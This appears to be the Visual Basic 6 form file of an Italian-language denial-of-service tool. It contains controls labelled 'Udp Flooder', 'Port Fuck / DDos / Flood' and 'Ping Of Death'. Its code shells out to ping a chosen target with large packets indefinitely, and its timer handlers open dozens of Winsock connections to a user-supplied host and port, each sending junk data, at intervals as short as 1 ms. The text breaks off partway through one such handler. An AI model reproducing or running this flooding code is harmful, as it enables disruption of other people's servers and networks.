      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock44 
      Left            =   11400
      Top             =   4320
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock45 
      Left            =   11400
      Top             =   3360
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock46 
      Left            =   11880
      Top             =   6240
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock47 
      Left            =   11400
      Top             =   5280
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock48 
      Left            =   10920
      Top             =   2880
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock49 
      Left            =   10440
      Top             =   6240
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock50 
      Left            =   10920
      Top             =   5760
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock51 
      Left            =   11880
      Top             =   5280
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock52 
      Left            =   9960
      Top             =   2880
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock53 
      Left            =   10440
      Top             =   5760
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock54 
      Left            =   10920
      Top             =   4800
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock55 
      Left            =   11880
      Top             =   4800
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock56 
      Left            =   10920
      Top             =   3360
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock57 
      Left            =   10440
      Top             =   5280
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock58 
      Left            =   11400
      Top             =   6240
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock59 
      Left            =   11400
      Top             =   4800
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock60 
      Left            =   10920
      Top             =   3840
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock65 
      Left            =   12360
      Top             =   5760
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock66 
      Left            =   12360
      Top             =   6240
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock67 
      Left            =   12360
      Top             =   5280
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock68 
      Left            =   12360
      Top             =   4800
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock69 
      Left            =   12360
      Top             =   4320
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock70 
      Left            =   12360
      Top             =   3840
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock71 
      Left            =   12360
      Top             =   3360
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock72 
      Left            =   12360
      Top             =   2880
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock73 
      Left            =   12840
      Top             =   5760
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock74 
      Left            =   12840
      Top             =   6240
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock75 
      Left            =   12840
      Top             =   5280
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock76 
      Left            =   12840
      Top             =   4800
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock77 
      Left            =   12840
      Top             =   4320
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock78 
      Left            =   12840
      Top             =   3840
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock79 
      Left            =   12840
      Top             =   3360
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock80 
      Left            =   12840
      Top             =   2880
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock81 
      Left            =   13320
      Top             =   5760
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock82 
      Left            =   13320
      Top             =   6240
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock83 
      Left            =   13320
      Top             =   5280
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock84 
      Left            =   13320
      Top             =   4800
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock85 
      Left            =   13320
      Top             =   4320
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock86 
      Left            =   13320
      Top             =   3840
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock87 
      Left            =   13320
      Top             =   3360
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock88 
      Left            =   13320
      Top             =   2880
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock89 
      Left            =   13800
      Top             =   5760
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock90 
      Left            =   13800
      Top             =   6240
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock91 
      Left            =   13800
      Top             =   5280
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock92 
      Left            =   13800
      Top             =   4800
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock93 
      Left            =   13800
      Top             =   4320
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock94 
      Left            =   13800
      Top             =   3840
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock95 
      Left            =   13800
      Top             =   3360
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock96 
      Left            =   13800
      Top             =   2880
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock102 
      Left            =   13920
      Top             =   7200
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock103 
      Left            =   13560
      Top             =   7200
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock104 
      Left            =   12960
      Top             =   7200
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock105 
      Left            =   12480
      Top             =   7200
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock116 
      Left            =   8880
      Top             =   2160
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      Protocol        =   1
   End
   Begin MSWinsockLib.Winsock Winsock117 
      Left            =   9360
      Top             =   2160
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      Protocol        =   1
   End
   Begin MSWinsockLib.Winsock Winsock118 
      Left            =   9840
      Top             =   2160
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      Protocol        =   1
   End
   Begin MSWinsockLib.Winsock Winsock119 
      Left            =   10320
      Top             =   2160
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      Protocol        =   1
   End
   Begin MSWinsockLib.Winsock Winsock120 
      Left            =   10800
      Top             =   2160
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      Protocol        =   1
   End
   Begin MSWinsockLib.Winsock Winsock121 
      Left            =   11280
      Top             =   2160
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      Protocol        =   1
   End
   Begin MSWinsockLib.Winsock Winsock122 
      Left            =   11760
      Top             =   2160
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      Protocol        =   1
   End
   Begin MSWinsockLib.Winsock Winsock123 
      Left            =   12240
      Top             =   2160
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      Protocol        =   1
   End
   Begin MSWinsockLib.Winsock Winsock124 
      Left            =   12720
      Top             =   2160
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      Protocol        =   1
   End
   Begin MSWinsockLib.Winsock Winsock136 
      Left            =   13200
      Top             =   2160
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      Protocol        =   1
   End
   Begin MSWinsockLib.Winsock Winsock107 
      Left            =   8880
      Top             =   1680
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      Protocol        =   1
   End
   Begin MSWinsockLib.Winsock Winsock108 
      Left            =   9360
      Top             =   1680
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      Protocol        =   1
   End
   Begin MSWinsockLib.Winsock Winsock109 
      Left            =   9840
      Top             =   1680
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      Protocol        =   1
   End
   Begin MSWinsockLib.Winsock Winsock110 
      Left            =   10320
      Top             =   1680
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      Protocol        =   1
   End
   Begin MSWinsockLib.Winsock Winsock111 
      Left            =   10800
      Top             =   1680
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      Protocol        =   1
   End
   Begin MSWinsockLib.Winsock Winsock112 
      Left            =   11280
      Top             =   1680
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      Protocol        =   1
   End
   Begin MSWinsockLib.Winsock Winsock113 
      Left            =   11760
      Top             =   1680
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      Protocol        =   1
   End
   Begin MSWinsockLib.Winsock Winsock114 
      Left            =   12240
      Top             =   1680
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      Protocol        =   1
   End
   Begin MSWinsockLib.Winsock Winsock115 
      Left            =   12720
      Top             =   1680
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      Protocol        =   1
   End
   Begin MSWinsockLib.Winsock Winsock125 
      Left            =   13200
      Top             =   1680
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      Protocol        =   1
   End
   Begin MSWinsockLib.Winsock Winsock126 
      Left            =   8880
      Top             =   1200
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      Protocol        =   1
   End
   Begin MSWinsockLib.Winsock Winsock127 
      Left            =   9360
      Top             =   1200
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      Protocol        =   1
   End
   Begin MSWinsockLib.Winsock Winsock128 
      Left            =   9840
      Top             =   1200
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      Protocol        =   1
   End
   Begin MSWinsockLib.Winsock Winsock129 
      Left            =   10320
      Top             =   1200
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      Protocol        =   1
   End
   Begin MSWinsockLib.Winsock Winsock130 
      Left            =   10800
      Top             =   1200
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      Protocol        =   1
   End
   Begin MSWinsockLib.Winsock Winsock131 
      Left            =   11280
      Top             =   1200
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      Protocol        =   1
   End
   Begin MSWinsockLib.Winsock Winsock132 
      Left            =   11760
      Top             =   1200
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      Protocol        =   1
   End
   Begin MSWinsockLib.Winsock Winsock133 
      Left            =   12240
      Top             =   1200
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      Protocol        =   1
   End
   Begin MSWinsockLib.Winsock Winsock134 
      Left            =   12720
      Top             =   1200
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      Protocol        =   1
   End
   Begin MSWinsockLib.Winsock Winsock135 
      Left            =   13200
      Top             =   1200
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      Protocol        =   1
   End
   Begin MSWinsockLib.Winsock Winsock137 
      Left            =   8880
      Top             =   720
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      Protocol        =   1
   End
   Begin MSWinsockLib.Winsock Winsock138 
      Left            =   9360
      Top             =   720
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      Protocol        =   1
   End
   Begin MSWinsockLib.Winsock Winsock139 
      Left            =   9840
      Top             =   720
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      Protocol        =   1
   End
   Begin MSWinsockLib.Winsock Winsock140 
      Left            =   10320
      Top             =   720
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      Protocol        =   1
   End
   Begin MSWinsockLib.Winsock Winsock141 
      Left            =   10800
      Top             =   720
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      Protocol        =   1
   End
   Begin MSWinsockLib.Winsock Winsock142 
      Left            =   11280
      Top             =   720
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      Protocol        =   1
   End
   Begin MSWinsockLib.Winsock Winsock143 
      Left            =   11760
      Top             =   720
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      Protocol        =   1
   End
   Begin MSWinsockLib.Winsock Winsock144 
      Left            =   12240
      Top             =   720
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      Protocol        =   1
   End
   Begin MSWinsockLib.Winsock Winsock145 
      Left            =   12720
      Top             =   720
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      Protocol        =   1
   End
   Begin MSWinsockLib.Winsock Winsock146 
      Left            =   13200
      Top             =   720
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      Protocol        =   1
   End
   Begin MSWinsockLib.Winsock Winsock147 
      Left            =   8880
      Top             =   240
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      Protocol        =   1
   End
   Begin MSWinsockLib.Winsock Winsock148 
      Left            =   9360
      Top             =   240
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      Protocol        =   1
   End
   Begin MSWinsockLib.Winsock Winsock149 
      Left            =   9840
      Top             =   240
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      Protocol        =   1
   End
   Begin MSWinsockLib.Winsock Winsock150 
      Left            =   10320
      Top             =   240
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      Protocol        =   1
   End
   Begin MSWinsockLib.Winsock Winsock151 
      Left            =   10800
      Top             =   240
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      Protocol        =   1
   End
   Begin MSWinsockLib.Winsock Winsock152 
      Left            =   11280
      Top             =   240
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      Protocol        =   1
   End
   Begin MSWinsockLib.Winsock Winsock153 
      Left            =   11760
      Top             =   240
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      Protocol        =   1
   End
   Begin MSWinsockLib.Winsock Winsock154 
      Left            =   12240
      Top             =   240
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      Protocol        =   1
   End
   Begin MSWinsockLib.Winsock Winsock155 
      Left            =   12720
      Top             =   240
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      Protocol        =   1
   End
   Begin MSWinsockLib.Winsock Winsock156 
      Left            =   13200
      Top             =   240
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      Protocol        =   1
   End
   Begin VB.Label Label21 
      AutoSize        =   -1  'True
      BackColor       =   &H00000000&
      Caption         =   "0"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H0000FF00&
      Height          =   240
      Left            =   1320
      TabIndex        =   53
      Top             =   7560
      Width           =   135
   End
   Begin VB.Label Label20 
      AutoSize        =   -1  'True
      BackColor       =   &H00000000&
      Caption         =   "Pacchetti Inviati"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H0000FF00&
      Height          =   195
      Left            =   720
      TabIndex        =   52
      Top             =   7320
      Width           =   1410
   End
   Begin VB.Label Label19 
      AutoSize        =   -1  'True
      BackColor       =   &H00000000&
      Caption         =   "Sono Fermo"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H0000FF00&
      Height          =   240
      Left            =   1080
      TabIndex        =   50
      Top             =   9960
      Width           =   1275
   End
   Begin VB.Label Label18 
      AutoSize        =   -1  'True
      BackColor       =   &H00000000&
      Caption         =   "Status:"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H0000FF00&
      Height          =   240
      Left            =   240
      TabIndex        =   49
      Top             =   9960
      Width           =   720
   End
   Begin VB.Label Label1 
      AutoSize        =   -1  'True
      BackColor       =   &H00000000&
      ForeColor       =   &H0000FF00&
      Height          =   195
      Left            =   960
      TabIndex        =   44
      Top             =   3960
      Width           =   45
   End
   Begin VB.Image Image1 
      Height          =   780
      Left            =   960
      Picture         =   "Form1.frx":4C63
      Top             =   0
      Width           =   6525
   End
   Begin VB.Line Line3 
      X1              =   9840
      X2              =   13320
      Y1              =   2760
      Y2              =   2760
   End
   Begin VB.Label Label17 
      AutoSize        =   -1  'True
      BackColor       =   &H00000000&
      Caption         =   "0"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H0000FF00&
      Height          =   240
      Left            =   6840
      TabIndex        =   39
      Top             =   7560
      Width           =   135
   End
   Begin VB.Label Label16 
      AutoSize        =   -1  'True
      BackColor       =   &H00000000&
      Caption         =   "0"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H0000FF00&
      Height          =   240
      Left            =   4080
      TabIndex        =   38
      Top             =   7560
      Width           =   135
   End
   Begin VB.Label Label14 
      AutoSize        =   -1  'True
      BackColor       =   &H00000000&
      Caption         =   "Connessioni Effettuate UDP:"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H0000FF00&
      Height          =   195
      Left            =   5640
      TabIndex        =   37
      Top             =   7320
      Width           =   2445
   End
   Begin VB.Label Label6 
      AutoSize        =   -1  'True
      BackColor       =   &H00000000&
      Caption         =   "Connessioni Effettuate TCP:"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H0000FF00&
      Height          =   195
      Left            =   2760
      TabIndex        =   36
      Top             =   7320
      Width           =   2415
   End
   Begin VB.Line Line2 
      BorderColor     =   &H0000FF00&
      X1              =   4200
      X2              =   4200
      Y1              =   4440
      Y2              =   1920
   End
   Begin VB.Label Label15 
      AutoSize        =   -1  'True
      BackColor       =   &H00000000&
      Caption         =   "Potenza UDP"
      ForeColor       =   &H0000FF00&
      Height          =   195
      Left            =   5640
      TabIndex        =   27
      Top             =   3000
      Width           =   975
   End
   Begin VB.Label Label13 
      AutoSize        =   -1  'True
      BackColor       =   &H00000000&
      Caption         =   "0"
      ForeColor       =   &H0000FF00&
      Height          =   195
      Left            =   6240
      TabIndex        =   26
      Top             =   5880
      Width           =   90
   End
   Begin VB.Label Label12 
      AutoSize        =   -1  'True
      BackColor       =   &H00000000&
      Caption         =   "Risposta:"
      ForeColor       =   &H0000FF00&
      Height          =   195
      Left            =   5040
      TabIndex        =   25
      Top             =   5880
      Width           =   660
   End
   Begin VB.Label Label11 
      AutoSize        =   -1  'True
      BackColor       =   &H00000000&
      Caption         =   "PIng ICMP"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   9.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H0000FF00&
      Height          =   240
      Left            =   120
      TabIndex        =   22
      Top             =   5520
      Width           =   930
   End
   Begin VB.Label Label10 
      AutoSize        =   -1  'True
      BackColor       =   &H00000000&
      Caption         =   "Time:"
      ForeColor       =   &H0000FF00&
      Height          =   195
      Left            =   1920
      TabIndex        =   17
      Top             =   4920
      Width           =   390
   End
   Begin VB.Label Label9 
      AutoSize        =   -1  'True
      BackColor       =   &H00000000&
      Caption         =   "KB:"
      ForeColor       =   &H0000FF00&
      Height          =   195
      Left            =   240
      TabIndex        =   16
      Top             =   4920
      Width           =   255
   End
   Begin VB.Label Label8 
      AutoSize        =   -1  'True
      BackColor       =   &H00000000&
      Caption         =   "Ping Of Death"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   9.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H0000FF00&
      Height          =   240
      Left            =   120
      TabIndex        =   14
      Top             =   4560
      Width           =   1230
   End
   Begin VB.Line Line1 
      BorderColor     =   &H0000FF00&
      X1              =   0
      X2              =   8400
      Y1              =   4440
      Y2              =   4440
   End
   Begin VB.Label Label7 
      AutoSize        =   -1  'True
      BackColor       =   &H00000000&
      Caption         =   "Stop"
      BeginProperty Font 
         Name            =   "System"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H0000FF00&
      Height          =   240
      Left            =   6120
      TabIndex        =   13
      Top             =   9960
      Width           =   435
   End
   Begin VB.Label Label5 
      AutoSize        =   -1  'True
      BackStyle       =   0  'Transparent
      Caption         =   "Udp Flooder"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H0000FF00&
      Height          =   240
      Left            =   5640
      TabIndex        =   4
      Top             =   2160
      Width           =   1320
   End
   Begin VB.Label Label4 
      AutoSize        =   -1  'True
      BackColor       =   &H00000000&
      Caption         =   "Port Fuck / DDos / Flood"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H0000FF00&
      Height          =   240
      Left            =   840
      TabIndex        =   3
      Top             =   2160
      Width           =   2565
   End
   Begin VB.Label Label3 
      AutoSize        =   -1  'True
      BackColor       =   &H00000000&
      Caption         =   "Potenza TCP"
      ForeColor       =   &H0000FF00&
      Height          =   195
      Left            =   1560
      TabIndex        =   2
      Top             =   3000
      Width           =   945
   End
   Begin VB.Menu popup1 
      Caption         =   "Opzioni"
      Begin VB.Menu popup2 
         Caption         =   "Telnet Manager"
      End
      Begin VB.Menu pop9 
         Caption         =   "Tools"
      End
      Begin VB.Menu pop10 
         Caption         =   "Aiuto"
      End
      Begin VB.Menu pupup4 
         Caption         =   "Riduci a Icona"
      End
      Begin VB.Menu popup5 
         Caption         =   "Esci"
      End
   End
   Begin VB.Menu popup6 
      Caption         =   "Info"
      Begin VB.Menu pupup7 
         Caption         =   "About"
      End
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim packet As Long
Private Sub Check1_Click()
If Check1.Value = 1 Then
TimerPING.Enabled = True
Else
TimerPING.Enabled = False
End If

End Sub

Private Sub Command1_Click()
Shell ("ping " & Text1.Text & " -l " & Text3.Text & " -t" & Text5.Text)
End Sub

Private Sub Command2_Click()
TimerPING.Interval = TextSec.Text
End Sub

Private Sub Command3_Click()
Form6.Show
End Sub

Private Sub Form_Load()
Form6.Timer1.Enabled = False
Unload Form6

End Sub

Private Sub Form_Unload(Cancel As Integer)
End
End Sub

Private Sub pop10_Click()
Form5.Show
End Sub

Private Sub pop9_Click()
Form4.Show
End Sub

Private Sub popup2_Click()
Form3.Show
End Sub
Private Sub popup5_Click()
End
End Sub

Private Sub pupup4_Click()
Me.WindowState = 1
End Sub

Private Sub pupup7_Click()
MsgBox "Programma Creato Da xXManuddXx per ulteriori informazioni o segnalazione bug email: xXManuddXx@hotmail.it", vbInformation
End Sub

Private Sub SD_Scroll()
If SD.Value = 10 Then
Timer3.Interval = "1"


End If
If SD.Value = 9 Then
Timer3.Interval = "10"

End If
If SD.Value = 8 Then
Timer3.Interval = "30"

End If
If SD.Value = 7 Then
Timer3.Interval = "50"

End If
If SD.Value = 6 Then
Timer3.Interval = "100"

End If
If SD.Value = 5 Then
Timer3.Interval = "200"

End If
If SD.Value = 4 Then
Timer3.Interval = "250"

End If
If SD.Value = 3 Then

Timer3.Interval = "300"

End If
If SD.Value = 2 Then

Timer3.Interval = "350"


End If
If SD.Value = 1 Then

Timer3.Interval = "400"

End If
If SD.Value = 0 Then

Timer3.Interval = "450"

End If

End Sub

Private Sub Slider2_Click()

End Sub

Private Sub SD2_Scroll()
If SD2.Value = 10 Then
Timer2.Interval = "1"


End If
If SD2.Value = 9 Then
Timer2.Interval = "10"

End If
If SD2.Value = 8 Then

Timer2.Interval = "30"

End If
If SD2.Value = 7 Then
Timer2.Interval = "50"


End If
If SD2.Value = 6 Then

Timer2.Interval = "100"

End If
If SD2.Value = 5 Then
Timer2.Interval = "200"


End If
If SD2.Value = 4 Then
Timer2.Interval = "250"

End If
If SD2.Value = 3 Then

Timer2.Interval = "300"

End If
If SD2.Value = 2 Then

Timer2.Interval = "350"


End If
If SD2.Value = 1 Then

Timer2.Interval = "400"

End If
If SD2.Value = 0 Then

Timer2.Interval = "450"

End If

End Sub

Private Sub Timer1_Timer()
Label7.Caption = Now
End Sub

Private Sub Timer2_Timer()
On Error Resume Next
Winsock107.Close
Winsock107.Connect Text1.Text, Text4.Text
Winsock107.SendData "ÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_ÆÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_Æ ping 127.0.0.1"
Label17.Caption = Label17.Caption + 1
Winsock108.Close
Winsock108.Connect Text1.Text, Text4.Text
Winsock108.SendData "ÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_ÆÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_Æ ping 127.0.0.1"
Label17.Caption = Label17.Caption + 1
Winsock109.Close
Winsock109.Connect Text1.Text, Text4.Text
Winsock109.SendData "ÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_ÆÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_Æ ping 127.0.0.1"
Label17.Caption = Label17.Caption + 1
Winsock110.Close
Winsock110.Connect Text1.Text, Text4.Text
Winsock110.SendData "ÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_ÆÆÆÆÆÆ<=_ÆÆÆ¤¤¤¤¤¤¤¤¤¤_Æ ping 127.0.0.1"
Label17.Caption = Label17.Caption + 1
Winsock111.Close
